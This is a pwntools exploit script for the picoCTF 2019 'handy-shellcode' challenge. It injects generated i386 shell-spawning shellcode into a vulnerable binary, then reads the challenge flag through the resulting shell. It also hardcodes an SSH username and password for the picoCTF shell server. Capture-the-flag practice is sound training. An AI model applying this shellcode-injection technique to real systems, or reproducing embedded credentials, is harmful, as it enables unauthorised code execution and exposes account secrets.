# from pwn import *

# sh = process('./vuln')

# sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
# sh.interactive()

from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='RootHunter', password="drxdoublevkay", port=22)
  sh = s.process('/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6/vuln')
  REMOTE = True

sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
sh.sendlineafter('# ', 'cat /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6/flag.txt')
sh.interactive()